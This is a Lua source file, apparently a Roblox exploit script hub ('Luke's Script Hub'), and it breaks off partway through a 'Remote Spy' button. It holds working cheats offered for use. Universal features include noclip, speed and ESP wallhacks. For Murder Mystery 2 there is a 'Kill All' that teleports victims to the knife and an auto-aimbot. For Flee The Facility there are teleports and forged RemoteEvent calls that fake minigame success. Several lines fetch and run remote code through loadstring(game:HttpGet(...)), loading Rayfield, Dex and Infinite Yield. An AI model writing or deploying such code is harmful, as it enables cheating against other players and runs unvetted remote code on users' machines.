local function WaitForGameAndPlayer()
	local gameLoaded = false
	local playerLoaded = false

	while not (gameLoaded and playerLoaded) do
		if game:IsLoaded() then
			gameLoaded = true
		end

		if game:GetService("Players").LocalPlayer then
			playerLoaded = true
		end

		task.wait()
	end
end

local function dist3d(pos1, pos2)
	return math.sqrt((pos2.x - pos1.x) ^ 2 + (pos2.y - pos1.y) ^ 2 + (pos2.z - pos1.z) ^ 2)
end

local Noclipping = nil
local Clip = true

local function removeCollisions(char)
	for _, child in pairs(char:GetDescendants()) do
		if child:IsA("BasePart") and child.CanCollide == true then
			child.CanCollide = false
		end
	end
end

local function enableNoclip()
	local speaker = game:GetService("Players").LocalPlayer
	local RunService = game:GetService("RunService")

	Clip = false
	task.wait(0.1)
	local function NoclipLoop()
		if Clip == false and speaker.Character ~= nil then
			for _, child in pairs(speaker.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = RunService.Stepped:Connect(NoclipLoop)
end

local function disableNoclip()
	if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
end

local function toggleNoclip()
	if Clip then
		enableNoclip()
	else
		disableNoclip()
	end
end

local function breakVelocity(t)
	task.spawn(function()
		local speaker = game:GetService("Players").LocalPlayer
		local BeenASecond, V3 = false, Vector3.new(0, 0, 0)
		task.spawn(function()
			task.wait(t)
			BeenASecond = true
		end)
		while not BeenASecond do
			for _, v in ipairs(speaker.Character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Velocity, v.RotVelocity = V3, V3
				end
			end
			task.wait()
		end
	end)
end

local function getRoot(char)
	if char and char:FindFirstChildOfClass("Humanoid") then
		return char:FindFirstChildOfClass("Humanoid").RootPart
	else
		return nil
	end
end

local function tweenGotoPart(part)
	local TweenService = game:GetService("TweenService")

	local plr = game:GetService("Players").LocalPlayer
	local char = plr and plr.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")

	if part:IsA("BasePart") then
		if hum and hum.SeatPart then
			hum.Sit = false
			task.wait(0.1)
		end
		task.wait(0.1)
		TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), { CFrame = part.CFrame }):Play()
	end
	breakVelocity(1)
end

local safeTweening = false
local function safeTweenToPart(part)
	local TweenService = game:GetService("TweenService")

	local plr = game:GetService("Players").LocalPlayer
	local char = plr and plr.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")

	local dist = dist3d(root.Position, part.Position)
	local t = dist / 16

	if part:IsA("BasePart") then
		safeTweening = true
		if hum and hum.SeatPart then
			hum.Sit = false
			task.wait(0.1)
		end
		task.wait(0.1)
		TweenService:Create(root, TweenInfo.new(t, Enum.EasingStyle.Linear), { CFrame = part.CFrame }):Play()

		task.delay(t, function()
			safeTweening = false
		end)
	end
	breakVelocity(t)
end

WaitForGameAndPlayer()

local looped_functions = {}

local path_toggled = false
table.insert(looped_functions, function()
	if path_toggled == true then
		local paths = game.Workspace:FindFirstChild("PATHS")
		if not paths then
			Instance.new("Folder", game.Workspace).Name = "PATHS"
		end

		for i, v in pairs(paths:GetChildren()) do
			v.Age.Value = v.Age.Value + 1
			if v.Age.Value > 0 then
				v:Destroy()
			end
		end

		local p = Instance.new("Part", paths)
		Instance.new("NumberValue", p).Name = "Age"
		p.Size = Vector3.new(5, 1, 5)
		p.Anchored = true
		local plr = game:GetService("Players").LocalPlayer
		local char = plr and plr.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChild("Humanoid")
		local rig = hum and hum.RigType

		if root and hum then
			if rig == Enum.HumanoidRigType.R15 then
				local i = root.Position
				local s = root.Size.Y
				local h = hum.HipHeight

				p.Position = Vector3.new(i.x, (i.y - s / 2) - h - 0.5, i.z)
			else
				local leg = char and char:FindFirstChild("Left Leg")
				if leg then
					local i = root.Position
					local s = root.Size.Y
					local h = leg.Size.Y

					p.Position = Vector3.new(i.x, (i.y - s / 2) - h - 0.5, i.z)
				end
			end
		end
	end
end)

local ctrl_click_delete_toggled = true
local function initCtrlClickDelete()
	local Plr = game:GetService("Players").LocalPlayer
	local Mouse = Plr:GetMouse()

	local deletedParts = Instance.new("Folder", game.Workspace)
	deletedParts.Name = "DELETED_PARTS"

	local index = 1

	local function isControlDown()
		local UIS = game:GetService("UserInputService")

		return UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.LeftMeta)
	end

	Mouse.Button1Down:connect(function()
		if not ctrl_click_delete_toggled then
			return
		end
		if not isControlDown() then
			return
		end
		if not Mouse.Target then
			return
		end
		local objHolder = Instance.new("ObjectValue", deletedParts)
		objHolder.Value = Mouse.Target
		objHolder.Name = "" .. index
		local objPos = Instance.new("Vector3Value", objHolder)
		objPos.Value = Mouse.Target.Position
		objPos.Name = "pos"
		Mouse.Target.Position = Vector3.new(100000000, 100000000, 100000000)

		index = index + 1
	end)

	Mouse.Button2Down:connect(function()
		if not ctrl_click_delete_toggled then
			return
		end
		if not isControlDown() then
			return
		end
		deletedParts:GetChildren()[#deletedParts:GetChildren()].Value.Position =
			deletedParts:GetChildren()[#deletedParts:GetChildren()].pos.Value
		deletedParts:GetChildren()[#deletedParts:GetChildren()]:Destroy()
	end)

	local h = Instance.new("Part", game.Workspace)
	local j = Instance.new("ObjectValue", deletedParts)
	j.Value = h
	j.Name = "0"
	local k = Instance.new("Vector3Value", j)
	k.Name = "pos"
	k.Value = Vector3.new(100000000, 100000000, 100000000)
end
initCtrlClickDelete()

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Window = Rayfield:CreateWindow({
	Name = "Luke's Script Hub",
	Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
	LoadingTitle = "Luke's Script Hub",
	LoadingSubtitle = "by @actuallyluke",
	ShowText = "Rayfield", -- for mobile users to unhide Rayfield, change if you'd like
	Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes

	ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)

	DisableRayfieldPrompts = false,
	DisableBuildWarnings = false, -- Prevents Rayfield from emitting warnings when the script has a version mismatch with the interface.

	ConfigurationSaving = {
		Enabled = true,
		FolderName = nil, -- Create a custom folder for your hub/game
		FileName = "Lukes Script Hub",
	},

	KeySystem = false, -- Set this to true to use our key system
})

local UniversalTab = Window:CreateTab("Universal", "globe")

local PathSection = UniversalTab:CreateSection("Path")

local PathKeybind = UniversalTab:CreateKeybind({
	Name = "Toggle Paths",
	CurrentKeybind = "N",
	HoldToInteract = false,
	Flag = "PathKeybind", -- A flag is the identifier for the configuration file. Make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function()
		path_toggled = not path_toggled
	end,
})

local DelSection = UniversalTab:CreateSection("Ctrl+Click Delete")

local CtrlClickInstructions = UniversalTab:CreateLabel("Ctrl+Left-Click a part to delete. Ctrl+Right-Click to restore")

local CtrlClickDelToggle = UniversalTab:CreateToggle({
	Name = "Ctrl+Click Delete",
	CurrentValue = true,
	Flag = nil, -- A flag is the identifier for the configuration file; make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(value)
		ctrl_click_delete_toggled = value
	end,
})

local UniversalESPSection = UniversalTab:CreateSection("Universal ESP")

local function updateESP(obj, color, enabled)
	local oldHl = obj:FindFirstChild("ESPHL")
	if oldHl then
		if not enabled then
			oldHl:Destroy()
		elseif color ~= oldHl.FillColor then
			oldHl.FillColor = color
		end
	elseif enabled then
		local hl = Instance.new("Highlight")
		hl.Name = "ESPHL"
		hl.Adornee = obj
		hl.FillColor = color
		hl.Parent = obj
	end
end

local function updateUniversalESP(enabled)
	for i, v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character and v ~= game:GetService("Players").LocalPlayer then
			updateESP(v.Character, Color3.fromRGB(255, 0, 0), enabled)
		end
	end
end

local universal_esp_toggled = false
local UniversalESPToggle = UniversalTab:CreateToggle({
	Name = "Universal ESP",
	CurrentValue = false,
	Flag = nil,
	Callback = function(value)
		universal_esp_toggled = value
		updateUniversalESP(universal_esp_toggled)
	end,
})
task.spawn(function()
	while task.wait() do
		if universal_esp_toggled then
			updateUniversalESP(universal_esp_toggled)
		end
	end
end)

local ussPlr = game:GetService("Players").LocalPlayer
local ussChar = ussPlr and ussPlr.Character
local ussHum = ussChar and ussChar:FindFirstChild("Humanoid")

local ussSpeed = (ussHum and ussHum.WalkSpeed) or 16

task.spawn(function()
	while task.wait() do
		local plr = game:GetService("Players").LocalPlayer
		local char = plr and plr.Character
		local hum = char and char:FindFirstChild("Humanoid")

		if hum then
			hum.WalkSpeed = ussSpeed
		end
	end
end)

local UniversalSpeedSlider = UniversalTab:CreateSlider({
	Name = "Speed",
	Range = { 0, 100 },
	Increment = 1,
	Suffix = "",
	CurrentValue = ussSpeed,
	Flag = nil, -- A flag is the identifier for the configuration file; make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(value)
		ussSpeed = value
	end,
})

-- Murder Mystery 2

if game.PlaceId == 142823291 then
	local MMTab = Window:CreateTab("Murder Mystery 2", "gamepad-2")
	local MMESPSection = MMTab:CreateSection("ESP")

	local function updatePlayerESP(enabled)
		for i, v in pairs(game:GetService("Players"):GetPlayers()) do
			if v.Character and v ~= game:GetService("Players").LocalPlayer then
				local backpack = v:FindFirstChild("Backpack")
				local char = v.Character

				local gunBackpack = backpack and backpack:FindFirstChild("Gun")
				local knifeBackpack = backpack and backpack:FindFirstChild("Knife")
				local gunPlayer = char and char:FindFirstChild("Gun")
				local knifePlayer = char and char:FindFirstChild("Knife")

				if gunBackpack or gunPlayer then
					updateESP(v.Character, Color3.fromRGB(0, 0, 255), enabled)
				end
				if knifeBackpack or knifePlayer then
					updateESP(v.Character, Color3.fromRGB(255, 0, 0), enabled)
				end
				if not knifeBackpack and not knifePlayer and not gunPlayer and not gunBackpack then
					updateESP(v.Character, Color3.fromRGB(0, 255, 0), enabled)
				end
			end
		end
	end

	local mm_player_esp_toggled = true
	local MMPlayerEspToggle = MMTab:CreateToggle({
		Name = "Player ESP",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			mm_player_esp_toggled = value
			updatePlayerESP(value)
		end,
	})
	task.spawn(function()
		while task.wait() do
			if mm_player_esp_toggled then
				updatePlayerESP(mm_player_esp_toggled)
			end
		end
	end)

	local function updateCoinESP(enabled)
		local coins = game.Workspace:FindFirstChild("CoinContainer", true)

		if coins then
			for i, v in pairs(coins:GetChildren()) do
				-- if v.Name == "Coin_Server" then
				-- 	updateESP(v, Color3.fromRGB(255, 200, 0), enabled)
				-- end
				if v.Name == "CollectedCoin" then
					v:Destroy()
				end
			end

			updateESP(coins, Color3.fromRGB(255, 200, 0), enabled)
		end
	end

	local mm_coin_esp_toggled = true
	local MMCoinEspToggle = MMTab:CreateToggle({
		Name = "Coin ESP",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			mm_coin_esp_toggled = value
			updateCoinESP(value)
		end,
	})
	task.spawn(function()
		while task.wait() do
			if mm_coin_esp_toggled then
				updateCoinESP(mm_coin_esp_toggled)
			end
		end
	end)

	local MMUtilsSection = MMTab:CreateSection("Utils")

	local MMKillAllButton = MMTab:CreateButton({
		Name = "Kill All (Murderer)",
		Callback = function()
			local plr = game:GetService("Players").LocalPlayer
			local char = plr and plr.Character
			local hum = char and char:FindFirstChild("Humanoid")
			local root = char and char:FindFirstChild("HumanoidRootPart")

			if hum then
				local backpack = plr:FindFirstChild("Backpack")
				local knifeBackpack = backpack and backpack:FindFirstChild("Knife")

				if knifeBackpack then
					hum:EquipTool(knifeBackpack)
					task.wait()
				end

				local knifePlayer = plr.Character:FindFirstChild("Knife")

				if knifePlayer then
					task.spawn(function()
						local running = true
						task.spawn(function()
							task.wait(1)
							running = false
						end)
						while running do
							for i, v in pairs(game:GetService("Players"):GetPlayers()) do
								local pChar = v.Character
								local pRoot = pChar and pChar:FindFirstChild("HumanoidRootPart")

								if pChar and v ~= game:GetService("Players").LocalPlayer then
									pRoot.CFrame = root.CFrame * CFrame.new(0, 0, -3)
								end
							end

							task.wait()
						end
					end)

					task.wait()

					knifePlayer:Activate()
				end
			end
		end,
	})

	local mm_grab_gun_toggled = true
	local MMGrabGunToggle = MMTab:CreateToggle({
		Name = "Auto Grab Gun",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			mm_grab_gun_toggled = value
		end,
	})
	task.spawn(function()
		local pickupGun = true

		while task.wait() do
			if mm_grab_gun_toggled then
				local gun = game.Workspace:FindFirstChild("GunDrop", true)

				if not gun and not pickupGun then
					pickupGun = true
				end

				if gun and pickupGun then
					local plr = game:GetService("Players").LocalPlayer
					local char = plr and plr.Character
					local root = char and char:FindFirstChild("HumanoidRootPart")
					local pos = root and root.CFrame

					if root then
						task.wait(1)
						root.CFrame = gun.CFrame
						task.wait(0.2)
						root.CFrame = pos
					end

					pickupGun = false
				end
			end
		end
	end)

	local mm_kill_murderer_toggled = true
	local MMKillMurdererToggle = MMTab:CreateToggle({
		Name = "Auto Kill Murderer",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			mm_kill_murderer_toggled = value
		end,
	})
	task.spawn(function()
		while task.wait() do
			if mm_kill_murderer_toggled then
				local plr = game:GetService("Players").LocalPlayer
				local char = plr and plr.Character
				local hum = char and char:FindFirstChild("Humanoid")
				local root = char and char:FindFirstChild("HumanoidRootPart")
				local backpack = plr and plr:FindFirstChild("Backpack")

				if hum then
					local gunBackpack = backpack and backpack:FindFirstChild("Gun")

					if gunBackpack then
						hum:EquipTool(gunBackpack)
						task.wait()
					end

					local gunPlayer = char and char:FindFirstChild("Gun")

					local camera = workspace.CurrentCamera

					if gunPlayer and root and camera then
						local murderer
						for i, v in pairs(game:GetService("Players"):GetPlayers()) do
							local pBackpack = v:FindFirstChild("Backpack")
							local pChar = v.Character

							local knifeBackpack = pBackpack and pBackpack:FindFirstChild("Knife")
							local knifePlayer = pChar and pChar:FindFirstChild("Knife")

							if knifeBackpack or knifePlayer then
								murderer = v
							end
						end

						local pChar = murderer and murderer.Character
						local pRoot = pChar and pChar:FindFirstChild("HumanoidRootPart")

						local hasFired = false

						if pRoot then
							plr.CameraMode = Enum.CameraMode.LockFirstPerson
							plr.CameraMinZoomDistance = 0.5
							plr.CameraMaxZoomDistance = 0.5

							task.wait(1)

							local pos = root.CFrame
							root.CFrame = pRoot.CFrame * CFrame.new(0, 0, 5)

							local startTime = tick()
							local connection

							connection = game:GetService("RunService").RenderStepped:Connect(function()
								local elapsed = tick() - startTime

								if elapsed > 0.35 then -- how long to force the look (0.2 seconds here)
									root.CFrame = pos -- return to original position
									plr.CameraMode = Enum.CameraMode.Classic
									plr.CameraMinZoomDistance = 0.5
									plr.CameraMaxZoomDistance = 128
									connection:Disconnect()
									return
								end

								-- Better first-person feel: look from roughly head height
								local head = char:FindFirstChild("Head")
								local camPos = head and head.Position or root.Position + Vector3.new(0, 1.5, 0)

								root.CFrame =
									CFrame.lookAt(root.Position, Vector3.new(pRoot.Position.X, 0, pRoot.Position.Z))
								camera.CFrame = CFrame.lookAt(camPos, pRoot.Position)

								-- local handle = gunPlayer:FindFirstChild("Handle")
								-- if handle then
								-- 	handle.CFrame = CFrame.lookAt(handle.Position, pRoot.Position)
								-- end

								if elapsed > 0.18 and not hasFired then
									gunPlayer:Activate()
									local mouse = plr:GetMouse()
									if mouse then
										print(mouse.Target)
									end
									hasFired = true
								end
							end)

							task.wait(3)
						end
					end
				end
			end
		end
	end)
end

-- Flee The Facility

if game.PlaceId == 893973440 then
	local FTFTab = Window:CreateTab("Flee The Facility", "gamepad-2")
	local FTFESPSection = FTFTab:CreateSection("ESP")

	local beast_esp_toggled = true
	function UpdateBeastESP()
		for i, v in pairs(game.Players:GetPlayers()) do
			if v.Character and v.Character:FindFirstChild("BeastPowers") and v ~= game.Players.LocalPlayer then
				updateESP(v.Character, Color3.fromRGB(255, 0, 0), beast_esp_toggled)
			end
		end
	end

	local FTFBeastEspToggle = FTFTab:CreateToggle({
		Name = "Beast ESP",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			beast_esp_toggled = value
			UpdateBeastESP()
		end,
	})

	local player_esp_toggled = true
	function UpdatePlrESP()
		for i, v in pairs(game.Players:GetPlayers()) do
			if v.Character and not v.Character:FindFirstChild("BeastPowers") and v ~= game.Players.LocalPlayer then
				updateESP(v.Character, Color3.fromRGB(0, 255, 0), player_esp_toggled)
			end
		end
	end

	local FTFPlayerEspToggle = FTFTab:CreateToggle({
		Name = "Player ESP",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			player_esp_toggled = value
			UpdatePlrESP()
		end,
	})

	local function getCurrentMap()
		for i, v in pairs(game.Workspace:GetChildren()) do
			if v:FindFirstChild("MapThumbnail") then
				return v
			end
		end

		return nil
	end

	local function getCurrentMapChildren()
		local map = getCurrentMap()
		if not map then
			return {}
		end

		return map:GetChildren()
	end

	local PCHighlights = {}
	local computer_esp_toggled = true

	local Comp = 0

	task.spawn(function()
		while task.wait() do
			local GotComputers = 0
			for _, v in pairs(getCurrentMapChildren()) do
				if v.Name == "ComputerTable" and v:FindFirstChild("Screen") then
					GotComputers += 1
					if computer_esp_toggled then
						local Found = false
						for i3, v3 in pairs(PCHighlights) do
							if v3.Adornee == v then
								v3.FillColor = v.Screen.Color
								Found = true
							end
						end
						if Found == false then
							local NewHighlight = Instance.new("Highlight")
							NewHighlight.FillColor = v.Screen.Color
							NewHighlight.Adornee = v
							NewHighlight.Parent = v
							table.insert(PCHighlights, NewHighlight)
						end
					else
						for i3, v3 in pairs(PCHighlights) do
							table.remove(PCHighlights, i3)
							v3:Destroy()
						end
					end
				end
			end

			if GotComputers ~= Comp then
				coroutine.wrap(function()
					if GotComputers == 0 then
						task.wait(1)
						UpdatePlrESP()
						UpdateBeastESP()
					else
						task.wait(3)
						UpdatePlrESP()
						task.wait(15)
						UpdateBeastESP()
					end
				end)()
				Comp = GotComputers
			end
		end
	end)

	local FTFPCEspToggle = FTFTab:CreateToggle({
		Name = "Computer ESP",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			computer_esp_toggled = value
		end,
	})

	task.spawn(function()
		while task.wait(5) do
			UpdateBeastESP()
			UpdatePlrESP()
		end

		UpdateBeastESP()
		UpdatePlrESP()
	end)

	local FTFUtilsSection = FTFTab:CreateSection("Utils")

	local no_errors_toggled = true
	local FTFNoErrorToggle = FTFTab:CreateToggle({
		Name = "No Errors",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			no_errors_toggled = value
		end,
	})

	local no_fog_toggled = true
	local FTFNoFogToggle = FTFTab:CreateToggle({
		Name = "No Fog",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			no_fog_toggled = value
		end,
	})

	local better_cam_toggled = true
	local FTFBetterCamToggle = FTFTab:CreateToggle({
		Name = "Better Camera",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			better_cam_toggled = value
		end,
	})

	local auto_hide_toggled = true
	local FTFAutoHideToggle = FTFTab:CreateToggle({
		Name = "Avoid Beast",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			auto_hide_toggled = value
		end,
	})

	local function isCloseToModel(model, ddist)
		local plr = game:GetService("Players").LocalPlayer
		local char = plr and plr.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")

		local base = model.PrimaryPart

		if root and base then
			local dist = dist3d(root.Position, base.Position)
			return dist <= ddist
		end

		return false
	end

	local function isCloseToModelName(name, ddist)
		for i, v in pairs(getCurrentMapChildren()) do
			if v.Name == name then
				if isCloseToModel(v, ddist) then
					return true, v
				end
			end
		end

		return false, nil
	end

	local function isCloseToComputer()
		return isCloseToModelName("ComputerTable", 10)
	end

	local function isCloseToFreezePod()
		return isCloseToModelName("FreezePod", 10)
	end

	local computerUnhacked = Color3.fromRGB(13, 105, 172)
	local computerErrored = Color3.fromRGB(196, 40, 28)
	local function getClosestComputer(includeHacked)
		local plr = game:GetService("Players").LocalPlayer
		local char = plr and plr.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")

		local best = nil
		local best_dist = 99999999

		if root then
			for i, v in pairs(getCurrentMapChildren()) do
				if v.Name == "ComputerTable" then
					local base = v.PrimaryPart

					if base then
						local dist = dist3d(root.Position, base.Position)

						if includeHacked then
							if dist < best_dist then
								best_dist = dist
								best = v
							end
						else
							local screen = v:FindFirstChild("Screen")
							if screen and (screen.Color == computerUnhacked or screen.Color == computerErrored) then
								if dist < best_dist then
									best_dist = dist
									best = v
								end
							end
						end
					end
				end
			end
		end

		return best
	end

	local function getValidSpot(computer)
		local screen = computer:FindFirstChild("Screen")
		if screen and (screen.Color == computerUnhacked or screen.Color == computerErrored) then
			local trigger1 = computer:FindFirstChild("ComputerTrigger1")
			local trigger2 = computer:FindFirstChild("ComputerTrigger2")
			local trigger3 = computer:FindFirstChild("ComputerTrigger3")

			local triggers = { trigger1, trigger2, trigger3 }

			for _, t in pairs(triggers) do
				local aSign = t:FindFirstChild("ActionSign")

				if aSign then
					if aSign.Value ~= 0 then
						return t
					end
				end
			end
		end

		return nil
	end

	local function findBeast()
		for i, v in pairs(game:GetService("Players"):GetPlayers()) do
			if
				v.Character
				and v.Character:FindFirstChild("BeastPowers")
				and v ~= game:GetService("Players").LocalPlayer
			then
				return v
			end
		end

		return nil
	end

	local function getDistToBeast()
		local beast = findBeast()
		local beastChar = beast and beast.Character
		local beastRoot = beastChar and beastChar:FindFirstChild("HumanoidRootPart")

		local plr = game:GetService("Players").LocalPlayer
		local char = plr and plr.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")

		if beastRoot and root then
			return dist3d(root.Position, beastRoot.Position)
		end

		return 99999999
	end

	local function isGameActive()
		return game.ReplicatedStorage.IsGameActive.Value and game.ReplicatedStorage.GameTimer.Value ~= 0
	end

	local function isBeast()
		local plr = game:GetService("Players").LocalPlayer
		local char = plr and plr.Character

		if isGameActive() and char then
			task.wait()
			return char:FindFirstChild("BeastPowers")
		end

		return false
	end

	local function getActivePlayers()
		local players = {}

		local plr = game:GetService("Players").LocalPlayer
		local pgui = plr and plr:FindFirstChild("PlayerGui")
		local sgui = pgui and pgui:FindFirstChild("ScreenGui")
		local sbars = sgui and sgui:FindFirstChild("StatusBars")

		local bars = sbars and sbars:GetChildren()

		if bars then
			for i, v in pairs(bars) do
				if v:IsA("TextLabel") then
					local name = v.ContentText
					local player = game:GetService("Players"):FindFirstChild(name)

					if player then
						table.insert(players, player)
					end
				end
			end
		end

		return players
	end

	local function isInGame()
		local plr = game:GetService("Players").LocalPlayer
		local players = getActivePlayers()

		if plr and players then
			for i, v in pairs(players) do
				if v == plr then
					return true
				end
			end
		end

		return false
	end

	-- local function get

	local beast_max_dist = 20
	local hidingFromBeast = false
	local function isInDanger()
		return getDistToBeast() <= beast_max_dist
	end

	local auto_e_toggled = true
	local quick_hack_toggled = true
	local auto_hack_toggled = false

	local FTFAutoEToggle
	FTFAutoEToggle = FTFTab:CreateToggle({
		Name = "Auto E",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			auto_e_toggled = value

			if quick_hack_toggled and not value then
				FTFAutoEToggle:Set(true)
			end
		end,
	})

	local FTFQuickHackToggle
	FTFQuickHackToggle = FTFTab:CreateToggle({
		Name = "Easy Hack (Requires Auto E)",
		CurrentValue = true,
		Flag = nil,
		Callback = function(value)
			quick_hack_toggled = value
			if value then
				FTFAutoEToggle:Set(true)
			end

			if auto_hack_toggled and not value then
				FTFQuickHackToggle:Set(true)
			end
		end,
	})

	local FTFAutoHackToggle = FTFTab:CreateToggle({
		Name = "Auto Hack (Requires Easy Hack)",
		CurrentValue = false,
		Flag = nil,
		Callback = function(value)
			auto_hack_toggled = value
			if value then
				FTFQuickHackToggle:Set(true)
			end
		end,
	})
	task.spawn(function()
		local last_computer = nil

		while task.wait(0.1) do
			local ictc, computer = isCloseToComputer()
			local ictfp, freeze_pod = isCloseToFreezePod()

			if (isInGame() and auto_e_toggled and (ictc or ictfp)) or (isBeast() and auto_e_toggled and ictfp) then
				game.ReplicatedStorage.RemoteEvent:FireServer("Input", "Action", true)
				task.wait(0.1)
				game.ReplicatedStorage.RemoteEvent:FireServer("Input", "Action", false)
			end

			if
				isInGame()
				and quick_hack_toggled
				and ictc
				and last_computer ~= computer
				and not isInDanger()
				and not hidingFromBeast
			then
				local plr = game:GetService("Players").LocalPlayer
				local char = plr and plr.Character
				local root = char and char:FindFirstChild("HumanoidRootPart")

				if root then
					local spot = getValidSpot(computer)

					task.spawn(function()
						local running = true

						task.spawn(function()
							while running and not isInDanger() and not hidingFromBeast do
								root.CFrame = spot.CFrame * CFrame.new(0, 0, 0.1)
								task.wait()
							end
						end)

						task.delay(1.5, function()
							running = false
						end)
					end)
				end
			end

			if isInGame() and auto_hack_toggled and not isInDanger() and not hidingFromBeast then
				local cComp = getClosestComputer(false)

				if not safeTweening and cComp and cComp ~= computer then
					local spot = getValidSpot(cComp)
					safeTweenToPart(spot)
				end
			end

			last_computer = computer
		end
	end)

	local FTFFreezePodKeybind = FTFTab:CreateKeybind({
		Name = "Teleport to Freeze Pod",
		CurrentKeybind = "F",
		HoldToInteract = false,
		Flag = "FTFFreezePodKeybind", -- A flag is the identifier for the configuration file. Make sure every element has a different flag if you're using configuration saving to ensure no overlaps
		Callback = function()
			local best_pod
			local best_pod_dist = 99999999

			local char = game:GetService("Players").LocalPlayer.Character
			local root = char and char:FindFirstChild("HumanoidRootPart")
			local plrPos = root and root.Position

			for i, v in pairs(game.Workspace:GetDescendants()) do
				if v.Name == "FreezePod" then
					local pod = v:FindFirstChild("PodTrigger")
					if pod then
						local capturedTorsoValue = pod:FindFirstChild("CapturedTorso")

						if capturedTorsoValue.Value == nil then
							local dist = dist3d(plrPos, pod.Position)
							if dist < best_pod_dist and dist > 20 then
								best_pod = pod
								best_pod_dist = dist
							end
						end
					end
				end
			end

			tweenGotoPart(best_pod)
		end,
	})

	task.spawn(function()
		local oldPos
		local oldPosV

		local V3 = Vector3.new(0, 0, 0)

		while task.wait() do
			if no_errors_toggled then
				game.ReplicatedStorage.RemoteEvent:FireServer("SetPlayerMinigameResult", true)
			end

			if no_fog_toggled then
				game:GetService("Lighting").Atmosphere.Density = 0
				game:GetService("Lighting").Atmosphere.Offset = 0
				game:GetService("Lighting").Atmosphere.Glare = 0
				game:GetService("Lighting").Atmosphere.Haze = 0
				game:GetService("Lighting").Blur.Enabled = false
				game:GetService("Lighting").DepthOfField.Enabled = false
				game:GetService("Lighting").Brightness = 2
				game:GetService("Lighting").ClockTime = 14
				game:GetService("Lighting").FogEnd = 100000
				game:GetService("Lighting").GlobalShadows = false
				game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
			end

			if better_cam_toggled then
				local player = game:GetService("Players").LocalPlayer
				if player then
					player.CameraMode = Enum.CameraMode.Classic
					player.CameraMaxZoomDistance = 30
				end
			end

			if auto_hide_toggled then
				local beast = findBeast()
				local beastChar = beast and beast.Character
				local beastRoot = beastChar and beastChar:FindFirstChild("HumanoidRootPart")

				local plr = game:GetService("Players").LocalPlayer
				local char = plr and plr.Character
				local root = char and char:FindFirstChild("HumanoidRootPart")

				if beastChar then
					if char then
						if isInDanger() then
							if not hidingFromBeast then
								oldPos = root.CFrame
								oldPosV = root.Position
								game.Workspace.Gravity = 0

								enableNoclip()

								task.wait(0.1)
								hidingFromBeast = true
							end
						end
					end
				elseif hidingFromBeast then
					root.CFrame = oldPos
					game.Workspace.Gravity = 196.2
					disableNoclip()
					hidingFromBeast = false
				end

				if hidingFromBeast then
					local testDist = dist3d(oldPosV, beastRoot.Position)

					if testDist >= beast_max_dist then
						root.CFrame = oldPos
						game.Workspace.Gravity = 196.21
						disableNoclip()
						hidingFromBeast = false
					else
						local newPos = beastRoot.CFrame * CFrame.new(0, -10, 0)
						root.CFrame = newPos

						for _, v in ipairs(char:GetDescendants()) do
							if v:IsA("BasePart") then
								v.Velocity, v.RotVelocity = V3, V3
							end
						end
					end
				end
			elseif hidingFromBeast then
				local plr = game:GetService("Players").LocalPlayer
				local char = plr and plr.Character
				local root = char and char:FindFirstChild("HumanoidRootPart")

				if root then
					root.CFrame = oldPos
				end

				game.Workspace.Gravity = 196.21
				disableNoclip()
				hidingFromBeast = false
			end
		end
	end)
end

-- Externals

local DexTab = Window:CreateTab("Dex", "telescope")

local dex_injected = false
local DexButton = DexTab:CreateButton({
	Name = "Inject Dex",
	Callback = function()
		if dex_injected then
			return
		end
		dex_injected = true
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-DEX-Explorer-29920"))()
	end,
})

local DexToggle = DexTab:CreateToggle({
	Name = "Load Dex on Startup",
	CurrentValue = false,
	Flag = "LoadDexOnStartup", -- A flag is the identifier for the configuration file; make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(value) end,
})

local IYTab = Window:CreateTab("IY", "terminal")

local iy_injected = false
local IYButton = IYTab:CreateButton({
	Name = "Inject IY",
	Callback = function()
		if iy_injected then
			return
		end
		iy_injected = true
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end,
})

local IYToggle = IYTab:CreateToggle({
	Name = "Load IY on Startup",
	CurrentValue = false,
	Flag = "LoadIYOnStartup", -- A flag is the identifier for the configuration file; make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(value) end,
})

local RSTab = Window:CreateTab("RS", "search")

local rs_injected = false
local RSButton = RSTab:CreateButton({
	Name = "Inject Remote Spy",
